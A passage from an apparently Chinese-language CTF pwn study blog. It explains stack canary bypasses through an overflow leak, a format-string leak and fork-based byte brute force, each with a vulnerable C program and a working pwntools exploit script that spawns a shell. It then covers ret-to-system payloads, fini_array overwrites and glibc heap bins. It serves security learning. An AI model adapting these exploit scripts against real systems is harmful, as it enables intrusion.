class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];			<span class="comment">// 栈溢出位置</span></span><br><span class="line">    <span class="comment">// 向buf中填入两次，因此第一次泄露canary，第二次getshell</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;	</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello Hacker!&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/15/CTF/image-20240412155534384.png" alt="image-20240412155534384"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由图可知，buf的位置是-0x70，var_C（canary）的位置是-0xc</span><br><span class="line">算出相对位置，通过printf函数泄露canary的值。具体见代码</span><br></pre></td></tr></table></figure>





<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>)</span><br><span class="line"><span class="comment"># sendline函数会在最后加上个一个换行符,正好替换掉了&#x27;\x00‘</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>))</span><br><span class="line">canary = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment"># 减去回车0x0a</span></span><br><span class="line">canary -= <span class="number">0x0a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Canary: &quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="comment"># 填充了0x70 + 4个字符后面正好接system函数</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="方法二-利用格式化字符串漏洞获取Canary"><a href="#方法二-利用格式化字符串漏洞获取Canary" class="headerlink" title="方法二 利用格式化字符串漏洞获取Canary"></a>方法二 利用格式化字符串漏洞获取Canary</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，从而进行栈溢出。</p>
<p><strong>如何确定canary的位置呢？</strong></p>
<ol>
<li><p>首先确认当前输入的文本在栈中的位置.</p>
<p>构造payload等于<code>aaaa</code>+n个<code>%x-</code>，然后观察输出，直到输出中包含<code>61616161</code>，即4个<code>a</code>的ascii码。如下所示：</p>
<p><img src="/2024/03/15/CTF/image-20240412204436854.png" alt="image-20240412204436854"></p>
<p>数出61616161出现的位置，这里出现在栈中第6个位置，对应第6个<code>%x</code></p>
</li>
<li><p>从上一题我们知道从栈顶到canary的距离是<code>0x70-0xc</code>，而printf中的一个<code>%x</code>会输出4个字节，因此间隔了<code>(0x70-0xC)/4=25</code>个<code>%x</code>，因此从第6个<code>%x</code>开始，再输出25个<code>%x</code>就是canary的值</p>
</li>
</ol>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491b6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用格式化字符串漏洞获取Canary</span></span><br><span class="line">payload1 = <span class="string">b&#x27;%x-&#x27;</span> * (<span class="number">6</span> + <span class="number">25</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recvbytes = p.recv()</span><br><span class="line"><span class="comment"># print(recvbytes)</span></span><br><span class="line"><span class="comment"># print(type(recvbytes.split(b&#x27;-&#x27;)[-2]))</span></span><br><span class="line"><span class="comment"># 这里不能使用u32()的原因：可能是因为得到的元素是一个bytes类型</span></span><br><span class="line">canary = <span class="built_in">int</span>(recvbytes.split(<span class="string">b&#x27;-&#x27;</span>)[-<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Canary: &quot;</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="方法三-逐字节爆破"><a href="#方法三-逐字节爆破" class="headerlink" title="方法三 逐字节爆破"></a>方法三 逐字节爆破</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>每次进程重启后的Canary是不同的，但是同一个进程中的Canary都是一样的。并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。<br>爆破次数：对于32位ELF，低字节固定是\x00，所以只需要对三个字节进行爆破。爆破方式是先利用栈溢出覆写次低字节，如果出错的话，会报错，获得正确的次低字节的话，不会报错。获取正确的次低字节之后，再依次爆破次高字节和高字节。每个字节的可能性是256，因此3个字节的逐个爆破总次数是256+256+256&#x3D;768次方法五 </p>
<h4 id="e-g-1"><a href="#e-g-1" class="headerlink" title="e.g."></a>e.g.</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test2.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello Hacker!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork()) <span class="comment">//father</span></span><br><span class="line">        &#123;</span><br><span class="line">            wait(<span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//child</span></span><br><span class="line">        &#123;</span><br><span class="line">            vuln();</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./test2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x80491e6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello Hacker!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 逐字节爆破</span></span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment"># 如果是64位的就要遍历7字节</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + canary + p8(j)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        time.sleep(<span class="number">0.01</span>)</span><br><span class="line">        res = p.recv()</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;stack smashing detected&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;the <span class="subst">&#123;i&#125;</span> is <span class="subst">&#123;<span class="built_in">hex</span>(j)&#125;</span>&#x27;</span>)</span><br><span class="line">            canary += p8(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">len</span>(canary) == i + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Canary: <span class="subst">&#123;<span class="built_in">hex</span>(u32(canary))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span> - <span class="number">0xc</span>) + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(system_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>









<h3 id="劫持-stack-chk-fail函数"><a href="#劫持-stack-chk-fail函数" class="headerlink" title="劫持__stack_chk_fail函数"></a>劫持__stack_chk_fail函数</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在开启canary保护的程序中，如果canary不对，程序会转到<strong>stack_chk_fail函数执行</strong>。stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。</p>
<h2 id="pwn-random伪随机数篇"><a href="#pwn-random伪随机数篇" class="headerlink" title="pwn random伪随机数篇"></a>pwn random伪随机数篇</h2><h3 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h3><p>glibc的意思是GNU libc，是GNU旗下的C标准库，后来被liunx运用了，因此在liunx中自带的libc就是glibc，这个libc和windows上的是不同的。</p>
<h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>要想使用random，首先要种下一颗“种子”，需要利用函数srand，意思是seed rand，不同的种子，得出来的random<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%9A%8F%E6%9C%BA%E6%95%B0&spm=1001.2101.3001.7020">随机数</a>的序列会不一样，我这里用1作为种子，得出来的序列如下图：</p>
<p><img src="/2024/03/15/CTF/image-20240424154727436.png" alt="image-20240424154727436"></p>
<p><img src="/2024/03/15/CTF/image-20240424154742639.png" alt="image-20240424154742639"></p>
<p>如果你也是用1作为种子，那么得出来的序列和我这个会是一样的，这就是伪随机。<br>通常情况下，会采用“当前时间”作为种子</p>
<p><img src="/2024/03/15/CTF/image-20240424154851884.png" alt="image-20240424154851884"></p>
<p><img src="/2024/03/15/CTF/image-20240424154910678.png" alt="image-20240424154910678"></p>
<h2 id="【PWN-·-总结】"><a href="#【PWN-·-总结】" class="headerlink" title="【PWN · 总结】"></a>【PWN · 总结】</h2><h3 id="call-system与system调用"><a href="#call-system与system调用" class="headerlink" title="call _system与system调用"></a>call _system与system调用</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon/article/details/132006814">【PWN · 总结】call _system与system调用_call system-CSDN博客</a></p>
<p>构造payload的时候有两种方式构造<br>第一种，溢出后的返回地址是system的地址，也就是plt表中system的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(<span class="number">0</span>)  + p32(binsh_addr)</span><br></pre></td></tr></table></figure>

<p>第二种，溢出后的返回地址是call system的地址，这是程序中出现过的调用system的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">binsh_addr = <span class="number">0x0804a024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(system_addr) + p32(binsh_addr)</span><br></pre></td></tr></table></figure>



<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>左侧找到相关函数，双击。 </p>
<p><img src="/2024/03/15/CTF/a12c305121ac49cfa4f95f03e1be1c06.png" alt="img"></p>
<p><img src="/2024/03/15/CTF/77b208c54b3a4f719cf1ce4b6b1f1a59.png" alt="img"></p>
<p>选中一行 <em><strong>*_system*</strong></em> 按x键，即交叉引用，找到程序中用到_system的其他位置</p>
<p><img src="/2024/03/15/CTF/f887c6d0071a4ff29d71217871f41026.png" alt="img"></p>
<p><img src="/2024/03/15/CTF/2ae6877506e742b5bdcb4ca14ad1c5b1.png" alt="img"></p>
<p>即可找到相关代码段</p>
<h2 id="重写fini-array"><a href="#重写fini-array" class="headerlink" title="重写fini_array"></a>重写fini_array</h2><ul>
<li>当<code>RELRO</code>保护为<code>NO RELRO</code>的时候，<code>init.array、fini.array、got.plt</code>均可读可写；为<code>PARTIAL RELRO</code>的时候，<code>ini.array、fini.array</code>可读不可写，<code>got.plt</code>可读可写；为<code>FULL RELRO</code>时，<code>init.array、fini.array、got.plt</code>均可读不可写。</li>
<li>程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针，在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针</li>
<li>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。一般来说，这个数组的长度为<code>1</code>，也就是说只能写一个地址。</li>
</ul>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol>
<li><code>Top chunk</code>:当程序第一次进行malloc时， heap被分为2块， 一块给用户，剩下的那块是top chunk， 再次申请堆块时要是没有合适的空间便回使用top chunk的空间</li>
<li>申请到的一块内存的起始地址≠你可以写入数据的起始地址，因为堆块头部会记录一些信息，一般有0x10大小的差距</li>
<li>申请的大小≠实际申请的大小，它会有一个取整的步骤</li>
</ol>
<h3 id="内存分配函数"><a href="#内存分配函数" class="headerlink" title="内存分配函数"></a>内存分配函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分配一块指定大小的内存空间,不会把内存清零</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">// 释放 address 所指向的内存块,但不会清理区块的内容</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *pointer)</span>;</span><br><span class="line"><span class="comment">// 分配 num 个长度为 size 的连续空间，将分配的区块全部清零</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">calloc</span><span class="params">(<span class="type">size_t</span> num, <span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="comment">// 重新分配内存，把内存扩展到 newsize</span></span><br><span class="line"><span class="comment">// 扩大：高位空闲直接扩大，否则在最后重新分配一块并把内容复制进来</span></span><br><span class="line"><span class="comment">// 缩小：如果不是最高位相当于free一块，如果是最高位释放的块合并到top chunk中</span></span><br><span class="line"><span class="comment">// 传入的address为空，相当于malloc函数，传入的newsize为0相当于free函数</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">realloc</span><span class="params">(<span class="type">void</span> *address, <span class="type">size_t</span> newsize)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"><span class="comment">// INTERNAL_SIZE_T即size_t,在32位系统上是32位无符号整数(4bytes)，在64位系统上是64位无符号整数(8bytes)</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  </span><br><span class="line">  INTERNAL_SIZE_T      size;       </span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>对chunk结构的解释</strong></p>
<ul>
<li><p><code>struct malloc_chunk*</code>是定义指针，定义的变量大小在32位系统占4个字节，在64位占8个字节。</p>
</li>
<li><p><code>prev_size</code>:前一个chunk空闲则记录了前一个chunk的大小，如果前一个chunk不空闲，那么这里存储的就是前一个chunk最后的数据.</p>
</li>
<li><p><code>size</code>:当前chunk的大小,并记录了当前chunk和前一个chunk的一些属性，二进制的后3位,chunk的大小必须是2*SIZE_SZ的整数倍，如果不满足会被强制转换为2 * SIZE_SZ的整数倍。</p>
<p><strong>size标志位</strong></p>
<ul>
<li><code>NON_MAIN_ARENA</code>:记录当前chunk是否不属于主线程，1代表不属于，0代表属于</li>
<li><code>IS_MAPPED</code>:记录当前chunk是否由mmap分配</li>
<li><code>PREV_INUSE</code>:记录前一个chunk块是否被分配，1代表被分配，0代表没有被分配。当一个 chunk 的 size 的 P 位为 0 时，说明前一个chunk空闲，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li><p><code>fd</code>:记录了下一个被free的chunk</p>
</li>
<li><p><code>bk</code>:记录了上一个被free的chunk</p>
</li>
<li><p><code>fd_nextsize</code>:指向前一个与当前chunk大小不同的第一个空闲块，不包含 bin 的头指针。</p>
</li>
<li><p><code>bk_nextsize</code> 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p>
</li>
</ul>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>ptmalloc把空闲的堆分成四种，分别是fast bins，small bins，large bins，unsorted bin<br>相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。<br>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure>


<p><img src="/2024/03/15/CTF/aHR0cHM6Ly9pbWFnZS4zMDAxLm5ldC9pbWFnZXMvMjAxNjA1MjUvMTQ2NDE0NTkxNjYxMDEucG5nIXNtYWxs" alt="结构图"><img src="/2024/03/15/CTF/20200112091744996.png" alt="image"></p>
<p>按顺序依次是:</p>
<ol>
<li>索引为1处是unsorted bin，存储的chunk没有排序</li>
<li>索引从2到63的bin称为small bin,同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li>
<li>small bins 后面的 bin 被称作 large bins，索引为64到126。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li>
<li>fastbins单独记录在一个fastbinsY数组中，个数为10，chunk size为16到80字节的chunk就叫做fast chunk</li>
</ol>
<h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h4><p><img src="/2024/03/15/CTF/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDEvMTEvZ29HQ04xcUJPaGtQWHRhLnBuZw" alt="image.png"></p>
<ol>
<li>使用LIFO(后入先出)算法，添加操作(free内存)就是将新的fast chunk加入链表尾，删除操作(malloc内存)就是将链表尾部的fast chunk删除。</li>
<li><code>chunk size</code>：10个fast bin中所包含的fast chunk size是按照步进8字节排列的，即第一个fast bin中所有fast chunk size均为16字节，第二个fast bin中为24字节，依次类推。在进行malloc初始化的时候，最大的fast chunk size被设置为80字节(chunk unused size为64字节)，因此默认情况下大小为16到80字节的chunk被分类到fast chunk</li>
<li>不会对free chunk进行合并操作。鉴于设计fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。</li>
<li>malloc(fast chunk)操作：即用户通过malloc请求的大小属于fast chunk的大小范围(注意：用户请求size加上16字节就是实际内存chunk size)。在初始化的时候fast bin支持的最大内存大小以及所有fast bin链表都是空的，所以当最开始使用malloc申请内存的时候，即使申请的内存大小属于fast chunk的内存大小(即16到80字节)，它也不会交由fast bin来处理，而是向下传递交由small bin来处理，如果small bin也为空的话就交给unsorted bin处理</li>
<li>free(fast chunk)操作：这个操作很简单，主要分为两步：先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小；然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。</li>
</ol>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到unsorted bin中。</p>
<ol>
<li>unsorted bin的个数： 1个。unsorted bin是一个由free chunks组成的循环双链表。</li>
<li>Chunk size: 在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中。这就是前言说的特例了，不过特例并非仅仅这一个，后文会介绍。</li>
</ol>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><ol>
<li>chunk size:从16到504字节(64位系统的话是从32字节到1008字节)</li>
<li>free(small chunk)：当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中</li>
</ol>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><ol>
